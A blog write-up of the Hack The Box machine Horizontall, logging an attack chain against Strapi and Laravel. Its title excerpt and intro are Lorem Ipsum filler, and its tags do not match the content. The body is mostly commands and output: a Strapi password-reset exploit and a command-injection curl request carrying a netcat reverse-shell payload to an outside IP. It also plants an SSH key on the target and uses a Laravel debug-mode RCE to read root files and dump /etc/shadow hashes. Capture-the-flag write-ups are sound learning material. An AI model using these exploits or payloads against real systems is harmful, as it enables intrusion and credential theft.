---
layout: single
title: Horizontall - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-08-31
classes: wide
header:
  teaser: /assets/images/htb-writeup-horizontall/horizontall_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-horizontall/horizontall_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb/horizontall]# nmap -Pn -n -sCV 10.129.206.206                                                                      (master✱)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
  |   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
  |_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
  80/tcp open  http    nginx 1.14.0 (Ubuntu)
  |_http-server-header: nginx/1.14.0 (Ubuntu)
  |_http-title: Did not follow redirect to http://horizontall.htb
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

DIRB:
==> DIRECTORY: http://horizontall.htb/css/
+ http://horizontall.htb/favicon.ico (CODE:200|SIZE:4286)
==> DIRECTORY: http://horizontall.htb/img/
+ http://horizontall.htb/index.html (CODE:200|SIZE:901)
==> DIRECTORY: http://horizontall.htb/js/

NIKTO:
+ Server: nginx/1.14.0 (Ubuntu)


2. Http-server redirect to horizontall.htb, add to /etc/hosts. Enumerating the website for hours and got nothing.
After A LOT of time i beutified the JS Source 'app.c68eb462.js' and within found a vhost:
>  r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s) {

Add api-prod.horizontall.htb to /etc/hosts.

[root:/git/htb/horizontall]# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://api-prod.horizontall.htb/FUZZ
Admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
ADMIN                   [Status: 200, Size: 854, Words: 98, Lines: 17]
admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1]
reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1]
robots.txt              [Status: 200, Size: 121, Words: 19, Lines: 4]
users                   [Status: 403, Size: 60, Words: 1, Lines: 1]

/admin is a strapi login prompt
/reviews we find three users - wail, doe, john
/robots.txt has nothing of use


3. By browsing asdasd and capturing it to burp, or using cURL we find strapi is running on version 3.0.0-beta.17.4.

Burp:
  GET /admin/init HTTP/1.1
  Host: api-prod.horizontall.htb

  HTTP/1.1 200 OK
  Server: nginx/1.14.0 (Ubuntu)
  ..
  {"data":{"uuid":"a55da3bd-9693-4a08-9279-f9df57fd1817","currentEnvironment":"development","autoReload":false,"strapiVersion":"3.0.0-beta.17.4"}}

cURL:
  [root:/git/htb/horizontall]# curl http://api-prod.horizontall.htb/admin/strapiVersion                                             (master✱)
    {"strapiVersion":"3.0.0-beta.17.4"}

A quick google about strapi version 3.0.0-beta.17.4 and we find CVE-2019-18818 which allows for unauthenticated change of password.
Very convenient as we have three found users - wail, doe, john. Download the script and fire

  [root:/git/htb/horizontall]# python cve-2019-18818.py wail http://api-prod.horizontall.htb test123                                           (master✱)
    [*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4
    [*] Sending password reset request...
    [*] Setting new password...
    [*] Response:
    {"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzMyNTY1LCJleHAiOjE2MzI5MjQ1NjV9.xjUBGvFvWqkQY2T79R3ihmocqhH02xYmQh7uCV10sis","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}

We should now be able to login to the dashboard with creds admin@horizontall.htb:test123


4. Further googling about strapi 3.0.0-beta.17.4 exploits I find CVE-2019-19609:
  > "The Strapi framework before 3.0.0-beta.17.8 is vulnerable to Remote Code Execution in the Install and Uninstall Plugin
  > components of the Admin panel, because it does not sanitize the plugin name, and attackers can inject arbitrary shell
  > commands to be executed by the execa function."

Trying to find a poc I find this a blogpost explaining the issue with this strapi version:
  > I noticed a bit of potentially dangerous code in the plugin installPlugin and uninstallPlugin handler functions for the admin panel (packages/strapi-admin/controllers/Admin.js):
  > Both functions pass unsanitized user input ctx.params.plugin to execa() which is executed on the system.
  > We can use command substitution to inject commands and execute arbitrary code alongside the node call:
  >  {"plugin": "documentation && $(whoami > /tmp/whoami)","port":"1337"}
  > This payload should create a /tmp/whoami file on the target system.

At the end of the blogpost they have a beautiful cURL string that will give us a reverse shell, if we have the JWT.
From our previous exploit (CVE-2019-18818) we got a JWT, so paste it and exploit!

  [root:/git/htb/horizontall]# curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzMyNTY1LCJleHAiOjE2MzI5MjQ1NjV9.xjUBGvFvWqkQY2T79R3ihmocqhH02xYmQh7uCV10sis' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.74 4488 >/tmp/f)\",\"port\":\"80\"}' $'http://api-prod.horizontall.htb/admin/plugins/install'

  [root:/git/htb/horizontall]# nc -lvnp 4488                                                                                        (master✱)
    listening on [any] 4488 ...
    connect to [10.10.15.74] from (UNKNOWN) [10.129.207.83] 48656
    /bin/sh: 0: can't access tty; job control turned off
    $ id && hostname
      uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
      horizontall
    $ pwd
      /opt/strapi/myapi
    $ ls -al /home
      total 12
      drwxr-xr-x  3 root      root      4096 May 25 11:43 .
      drwxr-xr-x 24 root      root      4096 Aug 23 11:29 ..
      drwxr-xr-x  8 developer developer 4096 Aug  2 12:07 developer
    $ cat /home/developer/user.txt
      06469191e69943c1c278099219ba813f



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Sudo -l isn't possible since we don't know the password.

Using linpeas we see that there are some locally running services.
Port 3306 is of course MYSQL used for strapi, which is running locally on port 1337.
However port 8000 is unknown.

strapi@horizontall:/dev/shm$ ./linpeas.sh
  ..
  [+] Active Ports
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
  Active Internet connections (servers and established)
  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
  tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
  tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
  tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
  tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1831/node /usr/bin/
  tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -

Trying to setup a SSH Tunnel from the inside out fails, we don't seem the have permission to SSH outside the box itself.
Lets create and add our public key to authorized_keys and tunnel from outside in.

  [root:/git/htb/horizontall]# ssh-keygen -t rsa                                                                                    (master✱)
    Generating public/private rsa key pair.
    Enter file in which to save the key (/root/.ssh/id_rsa): /git/htb/horizontall/id_rsa-strapi
    Enter passphrase (empty for no passphrase):
    Enter same passphrase again:
    Your identification has been saved in /git/htb/horizontall/id_rsa-strapi
    Your public key has been saved in /git/htb/horizontall/id_rsa-strapi.pub
    The key fingerprint is:
    SHA256:M354QA3Aiapd3GSLk5i6lKTYxVMatQQ3u4UY0UZBdjQ root@nidus
    The key's randomart image is:
    +---[RSA 3072]----+
    |    +X@=E        |
    |    o*O* +       |
    |   *.@+.o .      |
    | .+ @ o+         |
    |+=.o o. S        |
    |=oo    . =       |
    |..      o o      |
    |.        o       |
    |                 |
    +----[SHA256]-----+

  strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBW7rHQDr3PIFqAeOtCYA01Oreuarq7C1e57RZS9JNyfxCEkfzEzN5NMyTa187fWrfe3gyRAJit4Jii5ECSo1nNPNfJPb4XnxC97k8HGkRpKa8jmF81ua2CPUbcm/DEp51Q5ZK3kTjKmxCwVv3FcAOy+jz9mjl0PIN9e5o05SbbAaCgYT1ep0Z8XxgsDu+yMqyeqs2PgbA0O16Jo1SwMCfT6G4kK+m1eg0lEez/0NS03/Aa+9cezvA2QtBbq3MFIT6WtMjTKfETwqgsVelxIOEyLmpueSrVuuRONTiaKQaIb4kqbEwgRSbP8cDa7U5FH65inP4PQqWLgBeQ5Uk4Y5iejQGbHUiGoz7nGSFK48BBxvFa4+KrQ6xtV087EoS6b2L1+8sRESsNMoesXjo37n6vv8USbJzzX4GSD/TlYO8HIWOf1cb2GT08oglaWlIGZ+7VRlvGMX1FhAZ42s9qRZ3TlSfNmzZjJswm50WZscUdWE/q1HYSs9olpvrpavwC+c=" >> authorized_keys
  strapi@horizontall:~/.ssh$ chmod 600 authorized_keys

  [root:/git/htb/horizontall]# ssh -L 8000:localhost:8000 strapi@horizontall.htb -i id_rsa-strapi

  [root:/opt/scanners/linux]# netstat -antup
  Active Internet connections (servers and established)
  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
  ..
  tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      27624/ssh


If we now browse http://localhost:8000 we are met with Laravel v8 (PHP v7.4.18) default page.


2. Reading about Laravel on Hacktricks we find that there's a massive vuln if debuggging mode is enabled.
To verify if debugging is enabled, visit: http://127.0.0.1:8000/profiles, which it is.

CVE-2021-3129 allows us to execute commands if debugging is enabled. Google and download a script, phpggc and exploit.

  [root:/git/htb/horizontall]# wget https://raw.githubusercontent.com/simonlee-hello/CVE-2021-3129/main/exploit.py
  [root:/git/htb/horizontall]# git clone https://github.com/ambionics/phpggc.git
  [root:/git/htb/horizontall]# mv exploit.py cve-2021-3129.py
  [root:/git/htb/horizontall]# chmod +x cve-2021-3129.py
  [root:/git/htb/horizontall]# python3 cve-2021-3129.py http://127.0.0.1:8000 "id"
    [*] Try to use monolog_rce1 for exploitation.
    [*] Result:
    uid=0(root) gid=0(root) groups=0(root)

    [*] Try to use monolog_rce2 for exploitation.
    [*] Result:
    uid=0(root) gid=0(root) groups=0(root)

    [*] Try to use monolog_rce3 for exploitation.
    [*] Result:
    [-] RCE echo is not found.

Grab root.txt, /etc/shaodw and possible ssh private key.

  [root:/git/htb/horizontall]# python3 cve-2021-3129.py http://127.0.0.1:8000 "cat /root/root.txt"                                  (master✱)
    [*] Try to use monolog_rce1 for exploitation.
    [*] Result:
    d07fcc9c8053255d6f7ce4ebed7f7752

  [root:/git/htb/horizontall]# python3 cve-2021-3129.py http://127.0.0.1:8000 "cat /etc/shadow"
    [*] Try to use monolog_rce1 for exploitation.
    [*] Result:
    root:$6$rGxQBZV9$SbzCXDzp1MEx7xxXYuV5voXCy4k9OdyCDbyJcWuETBujfMrpfVtTXjbx82bTNlPK6Ayg8SqKMYgVlYukVOKJz1:18836:0:99999:7:::
    developer:$6$XWN/h2.z$Y6PfR1h7vDa5Hu8iHl4wo5PkWe/HWqdmDdWaCECJjvta71eNYMf9BhHCHiQ48c9FMlP4Srv/Dp6LtcbjrcVW40:18779:0:99999:7:::
    strapi:$6$a9mzQsIs$YENaG2S/H/9aqnHRl.6Qg68lCYU9/nDxvpV0xYOn6seH.JSGtU6zqu0OhR6qy8bATowftM4qBJ2ZA5x9EDSUR.:18782:0:99999:7:::


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Strapi 3.0.0-beta.17.4 exploit:
  CVE-2019-18818 - https://thatsn0tmysite.wordpress.com/2019/11/15/x05/
  CVE-2019-19609 - https://nvd.nist.gov/vuln/detail/CVE-2019-19609
                 - https://bittherapy.net/post/strapi-framework-remote-code-execution/

SSH Tunneling:
  https://www.booleanworld.com/guide-ssh-port-forwarding-tunnelling/

Laravel CVE-2021-3129:
  https://github.com/simonlee-hello/CVE-2021-3129
  https://book.hacktricks.xyz/pentesting/pentesting-web/laravel
